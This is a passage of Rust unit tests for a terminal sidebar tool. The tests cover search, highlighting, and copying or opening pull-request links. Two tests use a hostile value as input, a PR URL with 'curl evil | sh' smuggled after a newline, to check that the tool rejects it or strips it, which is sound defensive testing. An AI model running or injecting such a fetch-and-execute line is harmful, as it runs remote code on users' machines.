        rows.map(|line| line.trim_end_matches(['─', ' ']).to_owned()).collect()
    }

    /// The line the sessions of `mac`, the machine of `fresh`, start on, as
    /// the sidebar draws them: under its header, where it has one.
    fn sessions_from(lines: &[String]) -> usize {
        let header = lines.get(HEADER).is_some_and(|line| line.starts_with(" ▾ \u{f108} mac ═"));
        HEADER + usize::from(header)
    }

    /// The last line of the sidebar, focused: the keys the search takes, or
    /// else the last of the legend.
    fn bottom(sidebar: &mut Sidebar) -> String {
        screen(sidebar, true, 32, 17)[16].clone()
    }

    /// The search at the bottom of the sidebar, focused: its rule, what is
    /// typed, and the keys it takes.
    fn search_shown(sidebar: &mut Sidebar) -> Vec<String> {
        screen(sidebar, true, 32, 16)[13..].to_vec()
    }

    /// A session found by its name keeps all its panes, the highlight on the
    /// one of them that matches best, or else on the first, though the name
    /// matches better. The rule along the top counts what the search hides.
    #[test]
    fn a_search_keeps_the_rows_that_match_where_they_were() {
        let bipa = pane_of("bipa", 10, 3);
        let notes = pane_of("notes", 20, 1);
        let zed = pane_of("zed", 30, 2);
        for (typed, rows, best) in [
            ("pix", &[" ▾ bipa", "       a-p-i-x", "       pix outflow"][..], bipa),
            ("note", &[" ▾ notes", "     \u{e795} me/Documents"][..], notes),
            ("zed", &[" ▾ zed", "     \u{eb31} htop", "       z-e-d", "       less logs"][..], zed),
        ] {
            let mut sidebar = searched();
            type_in(&mut sidebar, &format!("/{typed}"));
            assert_eq!(rows_shown(&mut sidebar), rows, "{typed}");
            let rule = screen(&mut sidebar, true, 32, 16)[1].clone();
            assert!(rule.starts_with("─ 3 sessions ─"), "{typed}: {rule}");
            let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
            assert_eq!(sidebar.key(&enter, moment(160_000)), go_here(best), "{typed}");
        }
    }

    /// A tab zellij named, and the parts of a directory a row leaves out,
    /// find nothing. An agent's pane zellij has not said the directory of is
    /// found by where the agent works.
    #[test]
    fn a_pane_is_found_by_its_branch_its_named_tab_and_its_directory() {
        let mut notes = pane(1, 0, "/w/a", "nvim a");
        notes.tab_name = "notes".to_owned();
        let deep = pane(2, 1, "/home/lorenzo/Projects/misc/luneta", "nvim b");
        let branched = pane(3, 2, "/w/c", "nvim c");
        let unsaid = Pane {
            cwd: None,
            titled: Some(api::Titled { topic: Some("Rename the rows".to_owned()) }),
            ..pane(4, 3, "", "claude")
        };
        let elsewhere = "/w/fold/review".to_owned();
        let seated = Agent { cwd: elsewhere, ..agent("s", 4, Status::Idle, None) };
        let panes = vec![notes, deep, branched, unsaid];
        let mut host = host(vec![session("s", 10, panes)], vec![seated]);
        let name = Said::new("feature/sidebar".to_owned()).expect("a branch's name");
        let head = Head::Branch { name, upstream: None, changed: None };
        let changes = Changes::default();
        let tree = WorkTree::Checkout { repository: None, head, changes, stashes: 0 };
        host.work_trees.push(tree.to_api("/w/c"));
        let found = |typed: &str| {
            let mut sidebar = fresh();
            sidebar.heard(host.clone());
            type_in(&mut sidebar, &format!("/{typed}"));
            rows_shown(&mut sidebar)
        };
        assert_eq!(found("notes"), [" ▾ s", "     \u{e6ae} nvim a"]);
        assert_eq!(found("luneta"), [" ▾ s", "     \u{e6ae} nvim b"]);
        assert_eq!(found("sidebar"), [" ▾ s", "     \u{e6ae} nvim c", "       feature/sidebar"]);
        let seated = found("fold/review");
        assert!(seated.len() == 2 && seated[1].contains("Rename the rows"), "{seated:?}");
        assert_eq!(found("tab"), [" no match"]);
        assert_eq!(found("loren"), [" no match"]);
    }

    /// Closed by `Esc`, by `Enter` going to the row, or by zellij taking the
    /// keys.
    #[test]
    fn a_search_opens_a_folded_session_until_it_closes() {
        let keys = " b  Brief ▸";
        for close in [Some(KeyCode::Esc), Some(KeyCode::Enter), None] {
            let mut sidebar = searched();
            sidebar.key(&KeyEvent::new(KeyCode::Char('h'), KeyModifiers::NONE), moment(160_000));
            type_in(&mut sidebar, "/pix");
            let found = [" ▾ bipa", "       a-p-i-x", "       pix outflow"];
            assert_eq!(rows_shown(&mut sidebar), found, "{close:?}");
            let asked = if let Some(code) = close {
                sidebar.key(&KeyEvent::new(code, KeyModifiers::NONE), moment(160_000))
            } else {
                sidebar.focus(Keys::Zellij);
                Asked::Nothing
            };
            let pix = pane_of("bipa", 10, 3);
            let went = if close == Some(KeyCode::Enter) { go_here(pix) } else { Asked::Nothing };
            assert_eq!(asked, went, "{close:?}");
            assert_eq!(rows_shown(&mut sidebar)[..2], [" ▸ bipa", " ▾ notes"], "{close:?}");
            assert_eq!(bottom(&mut sidebar), keys, "{close:?}");
        }
    }

    /// A search goes to a pane of the folded session luneta's zellij is in,
    /// which unfolds as it goes. Folded there, the session stays so while
    /// luneta's zellij does.
    #[test]
    fn going_to_a_pane_found_in_luneta_s_folded_session_unfolds_it() {
        let mut sidebar = searched();
        sidebar.titled("bipa | a-p-i-x".to_owned());
        sidebar.key(&char('h'), moment(160_000));
        sidebar.titled("bipa | dda-bank-slip".to_owned());
        assert_eq!(rows_shown(&mut sidebar)[..2], [" ▸ bipa", " ▾ notes"]);
        type_in(&mut sidebar, "/pix");
        let pix = pane_of("bipa", 10, 3);
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        assert_eq!(sidebar.key(&enter, moment(160_000)), go_here(pix.clone()));
        sidebar.went(&pix);
        assert_eq!(rows_shown(&mut sidebar)[..2], [" ▾ bipa", "       a-p-i-x"]);
    }

    /// Every character types, `j` and `h` too, where the keys were, under a
    /// rule that names the search, over the keys it takes. Once something is
    /// typed, the rule counts the panes it finds, of every pane. A long
    /// search shows its end. `Backspace` takes a character back, and closes
    /// the search once there is none.
    #[test]
    fn what_is_typed_shows_where_the_keys_were() {
        let mut sidebar = searched();
        let backspace = KeyEvent::new(KeyCode::Backspace, KeyModifiers::NONE);
        let keys = " <ENTER> - Go, <ESC> - Close";
        type_in(&mut sidebar, "/");
        let rule = format!("─ Search {}", "─".repeat(22));
        assert_eq!(search_shown(&mut sidebar), [rule.as_str(), " _", keys]);
        type_in(&mut sidebar, "pixjh");
        let rule = format!("─ Search {} 0/7 ─", "─".repeat(16));
        assert_eq!(search_shown(&mut sidebar), [rule.as_str(), " pixjh_", keys]);
        assert_eq!(rows_shown(&mut sidebar), [" no match"]);
        sidebar.key(&backspace, moment(160_000));
        sidebar.key(&backspace, moment(160_000));
        assert_eq!(rows_shown(&mut sidebar), [" ▾ bipa", "       a-p-i-x", "       pix outflow"]);
        assert!(search_shown(&mut sidebar)[0].ends_with(" 2/7 ─"));
        for _ in 0..4 {
            sidebar.key(&backspace, moment(160_000));
        }
        assert_eq!(bottom(&mut sidebar), " b  Brief ▸");
        type_in(&mut sidebar, "/a-very-long-search-for-something");
        assert_eq!(search_shown(&mut sidebar)[1], " …ry-long-search-for-something_");
    }

    /// The keys under the search are spots that press them while it is open:
    /// `<ESC>` closes it. What is typed is no spot, and a click on a key of
    /// the search once the legend took its place does nothing, where the
    /// legend's own `Enter` would go to the highlighted row.
    #[test]
    fn a_click_on_a_key_under_the_search_presses_it_while_it_is_open() {
        let mut sidebar = searched();
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "/pix");
        let area = Rect::new(0, 0, 32, 16);
        let mut buffer = Buffer::empty(area);
        let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
        let keys: String = (0..31).map(|x| buffer[(x, 15)].symbol()).collect();
        let at = |key: &str| Position::new(u16::try_from(keys.find(key).unwrap()).unwrap(), 15);
        let (enter, esc) = (KeyEvent::from(KeyCode::Enter), KeyEvent::from(KeyCode::Esc));
        assert_eq!(drawn.at(at("<ENTER>")), Some(Hit::Keys(Keyed::Search, enter)));
        assert_eq!(drawn.at(at("<ESC>")), Some(Hit::Keys(Keyed::Search, esc)));
        assert_eq!(drawn.at(Position::new(2, 14)), None);
        assert_eq!(sidebar.keys_clicked(Keyed::Search, &esc, moment(160_000)), Asked::Nothing);
        assert_eq!(bottom(&mut sidebar), " b  Brief ▸");
        assert_eq!(sidebar.keys_clicked(Keyed::Search, &enter, moment(160_000)), Asked::Nothing);
        assert_eq!(bottom(&mut sidebar), " b  Brief ▸");
    }

    /// The search stays open under a box over zellij, but without the keys
    /// under it, which are the box's, as the legend goes. A click on one drawn
    /// before the box opened does nothing: `Enter` would go to the
    /// highlighted row from under a brief, and to the menu floating there.
    #[test]
    fn the_search_has_no_keys_under_a_box() {
        let mut sidebar = searched();
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "/pix");
        let enter = KeyEvent::from(KeyCode::Enter);
        let area = Rect::new(0, 0, 32, 16);
        let rule = format!("─ Search {} 2/7 ─", "─".repeat(16));
        for keys in [Keys::Lent, Keys::Menu { lent: true }] {
            sidebar.focus(keys);
            let mut buffer = Buffer::empty(area);
            sidebar.draw(&mut buffer, area, moment(160_000));
            let line = |y: u16| (0..31).map(|x| buffer[(x, y)].symbol()).collect::<String>();
            assert_eq!([line(14).trim_end(), line(15).trim_end()], [rule.as_str(), " pix_"]);
            let clicked = sidebar.keys_clicked(Keyed::Search, &enter, moment(160_000));
            assert_eq!(clicked, Asked::Nothing);
        }
        sidebar.focus(Keys::Sidebar);
        assert_eq!(search_shown(&mut sidebar)[1], " pix_");
    }

    /// What a search found of a pane's label lights up as the picker lights
    /// it, and of a session's name, underlined on its colour, as no colour
    /// reads on every session's.
    #[test]
    fn a_search_lights_what_it_found_of_each_row() {
        let mut sidebar = searched();
        type_in(&mut sidebar, "/zed");
        assert_eq!(rows_shown(&mut sidebar)[..3], [" ▾ zed", "     \u{eb31} htop", "       z-e-d"]);
        let zed = u16::try_from(sessions_from(&screen(&mut sidebar, true, 32, 16))).unwrap();
        let now = SystemTime::UNIX_EPOCH + Duration::from_secs(160);
        let buffer = drawn_at(&mut sidebar, true, 32, 16, now);
        let marked = |y: u16, mark: fn(&Cell) -> bool| -> String {
            let cells = (0..31).map(|x| &buffer[(x, y)]);
            cells.filter(|cell| mark(cell)).map(Cell::symbol).collect()
        };
        let underlined = |cell: &Cell| cell.modifier.contains(Modifier::UNDERLINED);
        let lit = |cell: &Cell| cell.fg == ACCENT && cell.modifier.contains(Modifier::BOLD);
        assert_eq!(marked(zed, underlined), "zed");
        assert_eq!(marked(zed + 1, lit), "");
        assert_eq!(marked(zed + 2, lit), "zed");
    }

    /// Of a text cut short, none of what the cut took lights up, nor the `…`
    /// that stands for it, whichever end the cut keeps: the picker keeps a
    /// directory's.
    #[test]
    fn what_the_cut_took_lights_nothing() {
        let (plain, hit) = (Style::new(), Style::new().fg(ACCENT).add_modifier(Modifier::BOLD));
        let (spans, wide) = lit("pix outflow", 8, Keep::Start, &[0, 7], plain);
        assert_eq!(spans, [Span::styled("p", hit), Span::styled("ix out…", plain)]);
        assert_eq!(wide, 8);
        // The `…` stands for the `e` too, and the `i` lights up past it.
        let (spans, wide) = lit("/w/luneta/main", 8, Keep::End, &[6, 12], plain);
        let (cut, n) = (Span::styled("…ta/ma", plain), Span::styled("n", plain));
        assert_eq!(spans, [cut, Span::styled("i", hit), n]);
        assert_eq!(wide, 8);
    }

    /// What a search found of a text in the accent already, as a waiting
    /// agent's is in the sidebar and the picker, is underlined: it would not
    /// show in the accent.
    #[test]
    fn a_hit_on_a_text_in_the_accent_is_underlined() {
        let accent = Style::new().fg(ACCENT).add_modifier(Modifier::BOLD);
        let (spans, _) = lit("zed", 8, Keep::Start, &[0], accent);
        let underlined = accent.add_modifier(Modifier::UNDERLINED);
        assert_eq!(spans, [Span::styled("z", underlined), Span::styled("ed", accent)]);
    }

    fn char(c: char) -> KeyEvent {
        KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE)
    }

    const LINK: &str = "https://github.com/owner/repo/pull/246";

    /// What `LINK` reads as.
    fn link() -> Link {
        Link::parse(LINK).expect("a link")
    }

    /// The branch `branch` checked out in `dir`, with `pull` for its pull
    /// request, as lunetad says them in `work_trees` and `pull_requests`.
    fn checked_out(
        work_trees: &mut Vec<api::WorkTree>,
        pull_requests: &mut Vec<api::PullRequest>,
        dir: &str,
        branch: &str,
        pull: Option<(u32, State, Option<&str>)>,
    ) {
        let name = Said::new(branch.to_owned()).expect("a branch's name");
        let head = Head::Branch { name, upstream: None, changed: None };
        let changes = Changes::default();
        let tree = WorkTree::Checkout { repository: None, head, changes, stashes: 0 };
        work_trees.push(tree.to_api(dir));
        if let Some((number, state, url)) = pull {
            let number = NonZeroU32::new(number).expect("a pull request's number");
            let url = url.map(str::to_owned);
            pull_requests.push(PullRequest { number, state, url, checks: None }.to_api(dir));
        }
    }

    /// The panes of a session `s`, by their id: 1 on a branch with a pull
    /// request, 2 with one from a daemon too old to say its link, 3 with one
    /// that is closed, and 4 with none.
    fn pulls() -> Sidebar {
        let dirs = ["/w/a", "/w/b", "/w/c", "/w/d"];
        let panes = dirs.iter().zip(1..).map(|(cwd, id)| pane(id, id, cwd, "fish")).collect();
        let mut host = host(vec![session("s", 10, panes)], Vec::new());
        let (trees, pulls) = (&mut host.work_trees, &mut host.pull_requests);
        let closed = "https://github.com/owner/repo/pull/9";
        checked_out(trees, pulls, "/w/a", "fix", Some((246, State::Open, Some(LINK))));
        checked_out(trees, pulls, "/w/b", "old", Some((7, State::Open, None)));
        checked_out(trees, pulls, "/w/c", "gone", Some((9, State::Closed, Some(closed))));
        checked_out(trees, pulls, "/w/d", "none", None);
        let mut sidebar = fresh();
        sidebar.heard(host);
        sidebar.focus(Keys::Sidebar);
        sidebar
    }

    /// The columns of the line `y` a click hits a pull request's number on,
    /// by `drawn`.
    fn number_spot(drawn: &Drawn, y: u16) -> Vec<u16> {
        let hits = |x: &u16| matches!(drawn.at(Position::new(*x, y)), Some(Hit::Number(_)));
        (0..64).filter(hits).collect()
    }

    /// `y` waits for what to yank, which the bottom of the sidebar lists, and
    /// `p` copies the link of the highlighted row's pull request. A note says
    /// so, as a copy shows nothing, in no colour of what went wrong, until the
    /// next key, or a while after: a click may leave the keys with zellij.
    #[test]
    fn y_p_copies_the_highlighted_row_s_link_and_a_note_says_so() {
        let mut sidebar = pulls();
        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
        let now = moment(160_000);
        assert_eq!(sidebar.key(&char('y'), now), Asked::Nothing);
        let (lines, _) = seen_at(&mut sidebar, true, 32, 24, now);
        let rule = format!("─ Yank {}", "─".repeat(24));
        assert_eq!(lines[22..], [rule, " p  PR link".to_owned()]);

        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(link()));
        let buffer = drawn_at(&mut sidebar, true, 32, 24, now);
        let (lines, _) = seen_at(&mut sidebar, true, 32, 24, now);
        let note = lines.iter().position(|line| line == " copied #246").expect("the note");
        assert_eq!(buffer[(1, u16::try_from(note).unwrap())].fg, NAME);
        assert!(lines.iter().any(|line| line.starts_with("─ luneta ──")), "the legend is back");

        let shown = |sidebar: &mut Sidebar, millis| {
            let at = moment(millis);
            sidebar.ticked(at, steady(at), true);
            seen_at(sidebar, false, 32, 24, at).0.contains(&" copied #246".to_owned())
        };
        assert!(shown(&mut sidebar, 162_999));
        assert!(!shown(&mut sidebar, 163_000));

        assert_eq!(sidebar.key(&char('y'), now), Asked::Nothing);
        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(link()));
        sidebar.key(&char('j'), now);
        assert_eq!(sidebar.copied, None);
    }

    /// `Esc` after `y` only drops it, as after a lone `g`. Any other key
    /// drops it and does what it does, and so does a click: `p` then has
    /// nothing to finish.
    #[test]
    fn y_waits_for_one_key_and_esc_only_drops_it() {
        let mut sidebar = pulls();
        let one = Spot::Local(pane_of("s", 10, 1));
        sidebar.cursor = Some(one.clone());
        let now = moment(160_000);
        let esc = KeyEvent::from(KeyCode::Esc);
        sidebar.key(&char('y'), now);
        assert_eq!(sidebar.key(&esc, now), Asked::Nothing);
        assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);
        assert_eq!(sidebar.key(&esc, now), Asked::Leave);

        sidebar.key(&char('y'), now);
        sidebar.key(&char('j'), now);
        assert_eq!(cursor(&sidebar), Some(pane_of("s", 10, 2)));
        assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);

        sidebar.cursor = Some(one);
        let area = Rect::new(0, 0, 32, 24);
        sidebar.key(&char('y'), now);
        sidebar.mouse(mouse(MouseEventKind::ScrollUp, 10, 4), area);
        assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);

        // The pointer moving is no click: luneta hears every move.
        sidebar.key(&char('y'), now);
        sidebar.mouse(mouse(MouseEventKind::Moved, 10, 4), area);
        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(link()));
    }

    /// A click on the `y` of the legend presses it, and on the `p` that takes
    /// the legend's place copies, as the keys do.
    #[test]
    fn a_click_on_y_then_on_p_copies() {
        let mut sidebar = pulls();
        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
        let now = moment(160_000);
        assert_eq!(sidebar.keys_clicked(Keyed::Legend, &char('y'), now), Asked::Nothing);
        let clicked = clicks(&mut sidebar, 18);
        assert_eq!(clicked[1], (" p  PR link".to_owned(), Some(on_legend('p'))));
        let copied = sidebar.keys_clicked(Keyed::Legend, &char('p'), now);
        assert_eq!(copied, Asked::Copy(link()));
    }

    /// `y p` and `o` go by the number the row shows: where it shows none, or
    /// one whose daemon did not say its link, they only leave a note. A
    /// session's row has none, and neither does a machine's header.
    #[test]
    fn the_keys_only_leave_a_note_on_a_row_with_no_link() {
        let none = "no pull request on this row";
        let old = "#7: lunetad says no link of it on github.com";
        let rows = [
            (Spot::Local(pane_of("s", 10, 2)), old),
            (Spot::Local(pane_of("s", 10, 3)), none),
            (Spot::Local(pane_of("s", 10, 4)), none),
            (Spot::Local(Place::Session(listed("s", 10))), none),
            (Spot::Machine(Machine::Local), none),
        ];
        let now = moment(160_000);
        for (spot, note) in rows {
            let mut sidebar = pulls();
            sidebar.cursor = Some(spot);
            sidebar.key(&char('y'), now);
            assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing, "{note}");
            assert_eq!(sidebar.notice.as_deref(), Some(note));
            assert_eq!(sidebar.copied, None);
            sidebar.notice = None;
            assert_eq!(sidebar.key(&char('o'), now), Asked::Nothing, "{note}");
            assert_eq!(sidebar.notice.as_deref(), Some(note));
        }
    }

    /// A pull request numbered 5, as its daemon says it, with `said` for its
    /// page, on the branch of the pane 1 of a session `s`.
    fn pull_said(said: &str) -> Sidebar {
        let panes = vec![pane(1, 1, "/w/a", "fish")];
        let mut host = host(vec![session("s", 10, panes)], Vec::new());
        let (trees, pulls) = (&mut host.work_trees, &mut host.pull_requests);
        checked_out(trees, pulls, "/w/a", "fix", Some((5, State::Open, Some(said))));
        let mut sidebar = fresh();
        sidebar.heard(host);
        sidebar.focus(Keys::Sidebar);
        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
        sidebar
    }

    /// What a daemon says of a page goes no further than its row unless it
    /// reads as the link of that very number, as another machine's says it,
    /// and the clipboard and the browser take what they are handed. The row
    /// shows its number all the same, which takes no click, and the keys only
    /// leave a note.
    #[test]
    fn a_page_that_is_not_the_link_of_the_number_stays_on_the_row() {
        let now = moment(160_000);
        for said in [
            "https://github.com/owner/repo/pull/6",
            "https://github.com/owner/repo/issues/5",
            "https://ghe.example/owner/repo/pull/5",
            "file:///tmp/run.desktop",
            "https://github.com/owner/repo/pull/5\ncurl evil | sh",
        ] {
            let mut sidebar = pull_said(said);
            let area = Rect::new(0, 0, 32, 24);
            let mut buffer = Buffer::empty(area);
            let drawn = sidebar.draw(&mut buffer, area, now);
            let line: String = (0..31).map(|x| buffer[(x, 6)].symbol()).collect();
            assert!(line.contains("fix #5"), "{said:?}: {line}");
            assert!(number_spot(&drawn, 6).is_empty(), "{said:?}");

            let note = "#5: lunetad says no link of it on github.com";
            sidebar.key(&char('y'), now);
            assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing, "{said:?}");
            assert_eq!(sidebar.notice.as_deref(), Some(note));
            assert_eq!(sidebar.copied, None);
            assert_eq!(sidebar.key(&char('o'), now), Asked::Nothing, "{said:?}");
            assert_eq!(sidebar.notice.as_deref(), Some(note));
        }
    }

    /// What is copied and opened is the link as luneta spells it again, with
    /// nothing of what came after its number.
    #[test]
    fn a_page_that_reads_is_taken_as_luneta_spells_it() {
        let now = moment(160_000);
        let mut sidebar = pull_said("https://github.com/owner/repo/pull/5?\ncurl evil | sh");
        let Asked::Browse(link) = sidebar.key(&char('o'), now) else {
            panic!("the row's link opens");
        };
        assert_eq!(link.url(), "https://github.com/owner/repo/pull/5");
    }

    /// `o` opens the link of the highlighted row, and neither it nor `y p`
    /// asks anything of another machine: its daemon said the link, and luneta
    /// runs where you sit.
    #[test]
    fn o_and_y_p_take_another_machine_s_link_too() {
        let mut sidebar = pulls();
        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
        let now = moment(160_000);
        assert_eq!(sidebar.key(&char('o'), now), Asked::Browse(link()));
        assert_eq!(sidebar.copied, None, "what opens shows");

        let far = "https://github.com/owner/repo/pull/8";
        let far_link = Link::parse(far).expect("a link");
        let mut host = machines();
        let Reached::Host(there) = host.remotes[0].reached.as_mut().unwrap() else {
            panic!("nixos is reached");
        };
        let (trees, pulls) = (&mut there.work_trees, &mut there.pull_requests);
        checked_out(trees, pulls, "/w/b", "fix", Some((8, State::Open, Some(far))));
        let mut sidebar = fresh();
        sidebar.heard(host);
        sidebar.focus(Keys::Sidebar);
        let place = Place::Pane(PanePlace { session: listed("main", 20), pane: 1 });
        sidebar.cursor = Some(Spot::Remote(nixos(), place));
        assert_eq!(sidebar.key(&char('o'), now), Asked::Browse(far_link.clone()));
        sidebar.key(&char('y'), now);
        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(far_link));
    }

    /// The number is a spot of its own, on exactly the columns it is drawn
    /// on, whatever keeps it there: a branch cut short, of wide characters,
    /// and how its work tree stands. The rest of its line is the pane's. It
    /// takes a click wherever the keys are. One with no link is the pane's
    /// too, and so is the line of a row with none.
    #[test]
    fn the_number_of_a_pull_request_is_a_spot_of_its_own() {
        let mut sidebar = pulls();
        let host = sidebar.host.as_mut().unwrap();
        let panes = ["/w/e", "/w/f"].iter().zip(5..).map(|(cwd, id)| pane(id, id, cwd, "fish"));
        host.sessions[0].panes.as_mut().unwrap().panes.extend(panes);
        let (trees, pulls) = (&mut host.work_trees, &mut host.pull_requests);
        let long = "handoff-eng-11259-and-more";
        let (merged, draft) = (LINK.replace("246", "4321"), LINK.replace("246", "12"));
        checked_out(trees, pulls, "/w/e", long, Some((4321, State::Merged, Some(&merged))));
        checked_out(trees, pulls, "/w/f", "日本語の枝の名前が長い", Some((12, State::Draft, Some(&draft))));
        let host = sidebar.host.clone().unwrap();
        sidebar.heard(host);

        for keys in [Keys::Zellij, Keys::Sidebar] {
            sidebar.focus(keys);
            let area = Rect::new(0, 0, 32, 32);
            let mut buffer = Buffer::empty(area);
            let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
            // The columns of `number`, by the cells it is drawn in.
            let columns = |y: u16, number: &str| {
                let cells: Vec<&str> = (0..31).map(|x| buffer[(x, y)].symbol()).collect();
                let start = cells.windows(number.len()).position(|it| it.concat() == number);
                let start = u16::try_from(start.expect(number)).unwrap();
                (start..start + u16::try_from(number.len()).unwrap()).collect::<Vec<_>>()
            };
            assert_eq!(number_spot(&drawn, 6), columns(6, "#246"));
            for (y, why) in [(8, "old: no link"), (10, "gone: closed"), (12, "none: no number")] {
                assert!(number_spot(&drawn, y).is_empty(), "{why}");
            }
            assert_eq!(number_spot(&drawn, 14), columns(14, "#4321"));
            assert_eq!(number_spot(&drawn, 16), columns(16, "#12"));
            let on = drawn.at(Position::new(columns(6, "#246")[0], 6));
            assert_eq!(on, Some(Hit::Number(link())));
        }
    }

    /// A number scrolled off the rows takes no click, and neither does what
    /// is drawn over the line it would be on; nor one under a session the
    /// mouse lifted, whose rows make room for it.
    #[test]
    fn a_number_out_of_sight_takes_no_click() {
        let mut sidebar = pulls();
        sidebar.focus(Keys::Zellij);
        // Four lines of rows, under the title, its rule and a blank: the
        // machine's header, the session's row, and the pane's two.
        let area = Rect::new(0, 0, 32, 7);
        let mut buffer = Buffer::empty(area);
        let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
        assert_eq!(number_spot(&drawn, 6).len(), "#246".len());

        // Scrolled past #246's line, as far as #7's, which has no link.
        sidebar.top = 4;
        let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
        assert_eq!((0..7).flat_map(|y| number_spot(&drawn, y)).count(), 0);

        // A note takes #246's line.
        sidebar.top = 0;
        sidebar.notify("something went wrong".to_owned());
        let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
        assert_eq!(number_spot(&drawn, 6), [] as [u16; 0]);
        sidebar.notice = None;

        // Lifted, by the session's row.
        let area = Rect::new(0, 0, 32, 24);
        let left = MouseButton::Left;
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 4), area);
        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 6), area), Asked::Take);
        let mut buffer = Buffer::empty(area);
        let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
        assert_eq!((0..24).flat_map(|y| number_spot(&drawn, y)).count(), 0);
    }

    /// A note that is no longer so goes by its words, and leaves another that
    /// is there in its place, as what went wrong as luneta started.
    #[test]
    fn a_note_no_longer_so_goes_and_leaves_any_other() {
        let mut sidebar = fresh();
        sidebar.notify("what goes wrong is kept in no log".to_owned());
        sidebar.unsay("no one reads");
        assert_eq!(sidebar.notice.as_deref(), Some("what goes wrong is kept in no log"));
        sidebar.notify("no one reads".to_owned());
        sidebar.unsay("no one reads");
        assert_eq!(sidebar.notice, None);
    }

    /// A click on a number copies its link and does nothing else: the
    /// highlight and the keys stay, and so does what the row's own click
    /// would do. It drops a `y` pressed before it, as any click does.
    #[test]
    fn a_click_on_a_number_copies_and_does_nothing_else() {
        let mut sidebar = pulls();
        sidebar.focus(Keys::Zellij);
        let here = sidebar.cursor.clone();
        let now = moment(160_000);
        sidebar.notify("what went wrong before".to_owned());
        assert_eq!(sidebar.number_clicked(link(), now), Asked::Copy(link()));
        assert_eq!(sidebar.cursor, here);
        assert_eq!(sidebar.keys, Keys::Zellij);
        assert_eq!(sidebar.notice, None);
        assert_eq!(sidebar.copied, Some((link().number(), now)));

        sidebar.focus(Keys::Sidebar);
        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
        sidebar.key(&char('y'), now);
        sidebar.number_clicked(link(), now);
        assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);
    }
    /// Each line of the sidebar drawn 32 by 19, from the line `from` down, as
    /// text, and what a click a few columns into it hits.
    fn clicks(sidebar: &mut Sidebar, from: u16) -> Vec<(String, Option<Hit>)> {
        let area = Rect::new(0, 0, 32, 20);
        let mut buffer = Buffer::empty(area);
        let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
        let text = |y| (0..31).map(|x| buffer[(x, y)].symbol()).collect::<String>();
        let click = |y| (text(y).trim_end().to_owned(), drawn.at(Position::new(4, y)));
        (from..20).map(click).collect()
    }

    fn on_legend(c: char) -> Hit {
        Hit::Keys(Keyed::Legend, char(c))
    }

    /// A click on the menu numbered 1 that presses `code`.
    fn on_menu(code: KeyCode) -> Hit {
        Hit::Menu(1, Choice::Key(KeyEvent::from(code)))
    }

    /// Each entry of the legend is a spot where it is drawn, that presses its
    /// key, and so is each of the menu once that opens it at the bottom, and
    /// the keys under them. The rows are none: a click there goes as before.
    #[test]
    fn a_click_on_the_legend_or_the_menu_under_it_presses_its_key() {
        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        let clicked = clicks(&mut sidebar, 0);
        assert!(clicked[..7].iter().all(|(_, hit)| hit.is_none()), "{clicked:?}");
        let legend: Vec<(&str, Option<Hit>)> =
            clicked[7..].iter().map(|(text, hit)| (text.as_str(), hit.clone())).collect();
        let rule = format!("─ luneta {}", "─".repeat(22));
        assert_eq!(legend, [
            (rule.as_str(), None),
            (" /  Search", Some(on_legend('/'))),
            (" u  Unread", Some(on_legend('u'))),
            (" v  Reorder", Some(on_legend('v'))),
            (" V  Move pane", Some(on_legend('V'))),
            (" o  Open PR", Some(on_legend('o'))),
            (" y  Yank ▸", Some(on_legend('y'))),
            (" a  Ask", Some(on_legend('a'))),
            (" c  Skills ▸", Some(on_legend('c'))),
            (" n  New ▸", Some(on_legend('n'))),
            (" t  Turn ▸", Some(on_legend('t'))),
            (" d  Delete ▸", Some(on_legend('d'))),
            (" b  Brief ▸", Some(on_legend('b'))),
        ]);
        sidebar.keys_clicked(Keyed::Legend, &char('n'), moment(160_000));
        let clicked = clicks(&mut sidebar, 14);
        let menu: Vec<(&str, Option<Hit>)> =
            clicked.iter().map(|(text, hit)| (text.as_str(), hit.clone())).collect();
        assert_eq!(menu, [
            ("─ New ─────────── luneta/main ─", None),
            (" p  new pane", Some(on_menu(KeyCode::Char('p')))),
            (" t  new tab", Some(on_menu(KeyCode::Char('t')))),
            (" s  new session", Some(on_menu(KeyCode::Char('s')))),
            (" m  new machine", Some(on_menu(KeyCode::Char('m')))),
            (" <BS> - Back, <ESC> - Close", Some(on_menu(KeyCode::Backspace))),
        ]);
    }

    /// A click on the legend that comes once the menu took its place, as the
    /// legend's `d` opened the Delete group there, does nothing: the group's
    /// own `d` deletes what the highlighted row is for.
    #[test]
    fn a_click_on_the_legend_once_the_menu_took_its_place_does_nothing() {
        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        sidebar.keys_clicked(Keyed::Legend, &char('d'), moment(160_000));
        let delete = clicks(&mut sidebar, 17);
        assert_eq!(delete[0].1, Some(on_menu(KeyCode::Char('d'))), "{delete:?}");
